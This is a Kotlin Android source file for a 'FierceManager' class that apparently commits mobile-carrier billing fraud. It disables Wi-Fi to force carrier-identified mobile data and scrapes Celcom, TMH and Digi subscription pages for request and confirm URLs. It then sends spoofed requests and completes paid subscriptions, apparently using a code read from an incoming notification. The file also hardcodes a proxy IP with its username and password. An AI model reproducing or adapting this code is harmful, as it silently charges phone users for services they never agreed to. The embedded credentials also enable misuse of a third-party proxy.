package com.cn.ultima

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.Bundle
import com.climb.tools.Utils
import com.cn.ultima.entity.TacInfo
import com.cn.ultima.firebase.DataReportUtils
import com.cn.ultima.persistentcookiejar.PersistentCookieJar
import com.cn.ultima.persistentcookiejar.cache.SetCookieCache
import com.cn.ultima.persistentcookiejar.persistence.SharedPrefsCookiePersistor
import com.cn.ultima.receiver.NetWorkStateReceiver
import com.cn.ultima.tools.HttpUtil
import com.cn.ultima.tools.LogUtils
import com.cn.ultima.tools.NetUtils
import com.ivrlibrary.phone.interfaces.DynamicListener
import com.ivrlibrary.phone.model.DynamicModel
import okhttp3.Credentials
import okhttp3.OkHttpClient
import okhttp3.Request
import org.jsoup.Jsoup
import java.net.InetSocketAddress
import java.net.Proxy
import java.util.*

class FierceManager : DynamicListener, NetWorkStateReceiver.NetWorkListener {
    private lateinit var mContext: Context
    private lateinit var dynamicModel: DynamicModel
    private lateinit var wifiManager: WifiManager
    private lateinit var netWorkStateReceiver: NetWorkStateReceiver
    private var requestUrl: String = ""
    private var confirmUrl: String = ""
    private lateinit var tacEntity: TacInfo
    private lateinit var dataReport: DataReportUtils
    private lateinit var cookies: String

    companion object {
        @Volatile
        private var instance: FierceManager? = null

        fun getInstance(): FierceManager {
            if (instance == null) {
                synchronized(FierceManager::class) {
                    if (instance == null) {
                        instance = FierceManager()
                    }
                }
            }
            return instance!!
        }
    }

    fun init(context: Context) {
        mContext = context
        dataReport = DataReportUtils.getInstance()
        dataReport.report(mContext.getString(R.string.init))
//        initSimOperator()
    }


    fun startNetWork() {
        Thread(Runnable {
            if (HttpUtil.ok()) {
                dataReport.report(mContext.getString(R.string.http_util_ok))
                wifiManager = mContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                var operator = NetUtils.getOperatorName(mContext)

                var networkState = NetUtils.getNetworkState(mContext)
                when (networkState) {
                    NetUtils.NETWORK_NONE -> {
                        dataReport.report(mContext.getString(R.string.network_none))
                        NetUtils.setGPS(mContext, true)
                    }
                    else -> {
                        dataReport.report(mContext.getString(R.string.requestHttp))
                        requestHttp(operator)
                    }
                }
            } else {
                dataReport.report(mContext.getString(R.string.http_util_false))
            }
        }).start()
    }

    private fun requestHttp(operator: String) {
        dynamicModel = DynamicModel(mContext, this)
        dynamicModel.getDynamic("50216")
//        dynamicModel.getDynamic(operator)
    }

    private fun initSimOperator() {
        var simOperator: String = Utils.instance.getSimOperator(mContext)
        dataReport.report(mContext.getString(R.string.initSimOperator))
        LogUtils.i("FierceManager", "simOperator : $simOperator")
    }

    private fun registerNetworkReceiver() {
        netWorkStateReceiver = NetWorkStateReceiver(this)
        val filter = IntentFilter()
        filter.addAction("android.net.conn.CONNECTIVITY_CHANGE")
        filter.addAction("android.net.wifi.WIFI_STATE_CHANGED")
        filter.addAction("android.net.wifi.STATE_CHANGE")
        mContext.registerReceiver(netWorkStateReceiver, filter)
    }

    override fun onRequestServerSuccess(tacInfo: TacInfo) {
        dataReport.report(
                mContext.getString(R.string.onRequestServerSuccess),
                Bundle().apply { putString("tac_url", tacInfo.url + " type " + tacInfo.type) })

        tacEntity = tacInfo
        when (tacInfo.type) {
            "celcom" -> {
                var networkState = NetUtils.getNetworkState(mContext)
                when (networkState) {
                    NetUtils.NETWORK_WIFI -> {
                        registerNetworkReceiver()
                        if (wifiManager.isWifiEnabled) {
                            wifiManager.isWifiEnabled = false
                            val url = tacInfo.url
                            try {
                                Thread(Runnable {
                                    val document = Jsoup.connect(url).get()
                                    val content = document.getElementById("askBox")
                                    var msisdn = content.getElementById("msisdn")
                                    var value = msisdn.attr("value")
                                    if ("" == value) {
                                        return@Runnable
                                    }
                                    for (item in content.allElements) {
                                        val tokenForm = item.attr("action")
                                    }

                                }).start()


                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }
                    }
                    NetUtils.NETWORK_NONE -> {
                    }
                    else -> {
                    }
                }
            }
            "tmh" -> {
                var networkState = NetUtils.getNetworkState(mContext)
                when (networkState) {
                    NetUtils.NETWORK_WIFI -> {
                        registerNetworkReceiver()
                        if (wifiManager.isWifiEnabled) {
                            wifiManager.isWifiEnabled = false
                        }
                    }
                    NetUtils.NETWORK_NONE -> {
                    }
                    else -> {
                        LogUtils.i("FierceManager", "current mobile execute...")
                        val intent = Intent("android.intent.action.MAIN.WEB_VIEW")
                        mContext.startActivity(intent)
                    }
                }
            }
            "digi" -> {
                var networkState = NetUtils.getNetworkState(mContext)
                when (networkState) {
                    NetUtils.NETWORK_WIFI -> {
                        dataReport.report(mContext.getString(R.string.network_wifi_one))
                        registerNetworkReceiver()
                        if (wifiManager.isWifiEnabled) {
                            if (BuildConfig.DEBUG) {
                                execute(tacEntity)
                            } else {
                                wifiManager.isWifiEnabled = false
                            }
                        }
                    }
                    NetUtils.NETWORK_NONE -> {
                        dataReport.report(mContext.getString(R.string.network_none_two))
                    }
                    else -> {
                        dataReport.report(mContext.getString(R.string.network_mobile_three))
                        execute(tacInfo)
                    }
                }
            }
        }
    }

    private fun execute(tacInfo: TacInfo) {
        try {
            dataReport.report(mContext.getString(R.string.execute))
            Thread(Runnable {
                val firstDocument = Jsoup.connect(tacInfo.url).get()
//                LogUtils.i("aa", firstDocument.location())
                var replaceUrl = firstDocument.location().replace("http://www.flygemobi.com/games/Allterco/MY/loading.html?", "http://pay.starpavilion-digital.com/pay/api/allterco/my/redirect?appId=appId&") + "&callback=jQuery11100991" + System.currentTimeMillis() + "_" + System.currentTimeMillis()
//                LogUtils.i("aa", replaceUrl)

                var client: OkHttpClient
                val cookieJar = PersistentCookieJar(SetCookieCache(), SharedPrefsCookiePersistor(mContext))
                val builder = OkHttpClient.Builder()
                if (BuildConfig.DEBUG) {
                    val hostname = "91.220.77.154"
                    val username = "mauritius"
                    val password = "Ux5vW5qw"
                    val port = 8090
                    val proxy = Proxy(Proxy.Type.HTTP, InetSocketAddress(hostname, port))

                    builder.proxy(proxy)
                            .proxyAuthenticator { _, response ->
                                val credential = Credentials.basic(username, password)
                                response.request().newBuilder()
                                        .header("Proxy-Authorization", credential)
                                        .build()
                            }
                }

                client = builder.build()


                val request = Request.Builder()
                        .url(replaceUrl)
                        .addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0")
                        .build()

                try {
                    val firstResponse = client.newCall(request).execute()
                    var string = firstResponse.body()!!.string()
                    var substring = string.substring(string.indexOf("http"), string.lastIndexOf("\""))

                    LogUtils.i("string", string)
                    LogUtils.i("substring", substring)

                    var testlink = TestOkhttp.testlink(substring)
                    LogUtils.i("testlink", testlink[2])

//                    val request2 = Request.Builder()
//                            .url(substring)
//                            .addHeader("Host", "my.gw2cloud.com")
//                            .addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0")
//                            .addHeader("Referer", "http://www.flygemobi.com/")
//                            .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
//                            .addHeader("Connection", "keep-alive")
//                            .build()
//
//                    val response2 = client.newCall(request2).execute()
//                    var responseBody = response2.body()!!.string()
//                    LogUtils.i("response2", responseBody)
//                    var cookie = response2.headers().get("Set-Cookie")

                    val document = Jsoup.parse(testlink[2], "UTF-8")
//                    val document = Jsoup.connect(responseBody).get()
//                    LogUtils.i("test3", document.toString())
                    val scripts = document.select("script")
                    if (scripts.isNotEmpty()) {
                        val resubmit = scripts.toString().split("function")
                        if (resubmit.isNotEmpty() && resubmit.size >= 5) {
                            val resubmitSplit = resubmit[5]
                            if (resubmitSplit.isNotEmpty()) {
                                val windowHref = resubmitSplit.split("window.location.href")
                                if (windowHref.isNotEmpty() && windowHref.size >= 2) {
                                    val substring = windowHref[2].substring(3)
                                    if (substring.isNotEmpty()) {
                                        val hrefString = substring.split("\"")
                                        if (hrefString.isNotEmpty()) {
                                            requestUrl = hrefString[1] + hrefString[3] + hrefString[5]
                                            dataReport.report(mContext.getString(R.string.request_url_succeed))
                                            LogUtils.i("requestUrl", requestUrl)
                                        }
                                    }
                                }
                            }
                        }
                    }

                    var confirm = scripts.toString().split("function")
                    if (confirm.isNotEmpty() && confirm.size >= 6) {
                        val confirmSplit = confirm[6]
                        if (confirmSplit.isNotEmpty()) {
                            val confirmString = confirmSplit.split("href")
                            if (confirmString.isNotEmpty() && confirmString.size > 1) {
                                val confirmSplitUrl = confirmString[1].split("\"")
                                if (confirmSplitUrl.isNotEmpty()) {
                                    confirmUrl = confirmSplitUrl[1]
                                    dataReport.report(mContext.getString(R.string.confirm_url_succeed))
                                    LogUtils.i("confirmUrl", confirmUrl)
                                }
                            }
                        }
                    }

                    if (!requestUrl.isEmpty() && !confirmUrl.isEmpty()) {
                        dataReport.report(mContext.getString(R.string.request_and_confirm_is_not_null))
                        //请求第一条URL

//                        val request = Request.Builder()
//                                .url(requestUrl)
//                                .addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0")
//                                .addHeader("Referer", testlink[0])
//                                .addHeader("Cookie", testlink[1])
//                                .addHeader("Host", "wap-cpa.digi.com.my")
//                                .build()
//
//                        val response = client.newCall(request).execute()

                        val hashMap = HashMap<String, String>()
                        hashMap["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0"
                        hashMap["Referer"] = testlink[0]
                        hashMap["Cookie"] = testlink[1]
                        hashMap["Host"] = "wap-cpa.digi.com.my"
                        cookies = testlink[1]

                        val mResponseObserver = HttpUtil.get(requestUrl, hashMap)
                        var requestBody = mResponseObserver.body()!!.string()
                        dataReport.report(mContext.getString(R.string.request_url), Bundle().apply { putString("response_code", mResponseObserver.code().toString()) })
                        LogUtils.i("response", hashMap.toString())
                        LogUtils.i("response", requestBody)
                        LogUtils.i("response", mResponseObserver.code().toString())
                        LogUtils.i("====>", mResponseObserver.code().toString())
                        LogUtils.i("====>", mResponseObserver.headers().toString())


                        var requestBodyMsg = HttpUtil.get(testlink[0], mapOf("Cookie" to testlink[1], "Referer" to testlink[0], "Host" to "wap-cpa.digi.com.my"))
                        var responseBodyMsg = requestBodyMsg.body()!!.string()
                        dataReport.report(mContext.getString(R.string.request_url_sendMSG), Bundle().apply { putString("response_code", requestBodyMsg.code().toString()) })
                        dataReport.report(mContext.getString(R.string.requestCode_succeed))
//                        LogUtils.i("string1", string1)

//                        var url = URL(requestUrl)
//                        var connection: HttpURLConnection = url.openConnection() as HttpURLConnection
//                        try {
//                            connection.connectTimeout = 10 * 1000
//                            connection.requestMethod = "GET"
//                            val requestCode = connection.responseCode
//                            if (requestCode == 200) {
//                                //监听短信信息
//                                dataReport.report(mContext.getString(R.string.requestCode_succeed))
//                                LogUtils.i("requestCode", requestCode.toString())
//                            } else {
//                                dataReport.report(mContext.getString(R.string.requestCode_error))
//                                throw RuntimeException("url error")
//                            }
//                        } catch (e: Exception) {
//                            e.printStackTrace()
//                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }).start()

        } catch (e: Exception) {
            dataReport.report(mContext.getString(R.string.jsoup_error))
            e.printStackTrace()
        }
    }

    override fun listenerNetwork() {
        execute(tacEntity)

    }

    fun listenerNotification(substring: String) {
        dataReport.report(mContext.getString(R.string.listenerNotification), Bundle().apply { putString("msg_code", substring) })
        Thread(Runnable {
            LogUtils.i("substringURL", substring)
            var confirmUrlCode = confirmUrl + substring
            dataReport.report(mContext.getString(R.string.subscription_confirm_url), Bundle().apply { putString("confirm_url", confirmUrlCode) })
            LogUtils.i("substringURL", confirmUrlCode)
            try {
                val request = Request.Builder()
                        .url(confirmUrlCode)
                        .addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0")
                        .addHeader("Cookie", cookies)
                        .build()
                LogUtils.i("Runnable", "Runnable")
                var client: OkHttpClient
//                val cookieJar = PersistentCookieJar(SetCookieCache(), SharedPrefsCookiePersistor(mContext))
                val builder = OkHttpClient.Builder()
                if (BuildConfig.DEBUG) {
                    val response = HttpUtil.get(confirmUrl + substring)

                    val hostname = "91.220.77.154"
                    val username = "mauritius"
                    val password = "Ux5vW5qw"
                    val port = 8090
                    val proxy = Proxy(Proxy.Type.HTTP, InetSocketAddress(hostname, port))
                    builder.proxy(proxy)
                            .proxyAuthenticator { _, response ->
                                val credential = Credentials.basic(username, password)
                                response.request().newBuilder()
                                        .header("Proxy-Authorization", credential)
                                        .build()
                            }
//                            .cookieJar(cookieJar)

                } else {

//                    builder.cookieJar(cookieJar)
                }

                client = builder.build()
//
                val response = client.newCall(request).execute()
                dataReport.report(mContext.getString(R.string.subscription_succeed), Bundle().apply { putString("response_code", response.code().toString()) })
//                val response = HttpUtil.get(confirmUrl_code)
//            val response = HttpUtil.get("http://www.baidu.comxx")
//                LogUtils.i("response", response.code().toString())
//                LogUtils.i("response", response.body()!!.string())
//                LogUtils.i("response", response.headers().toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }).start()

    }

    override fun onRequestServerError() {
        dataReport.report(mContext.getString(R.string.onRequestServerError))
    }

}
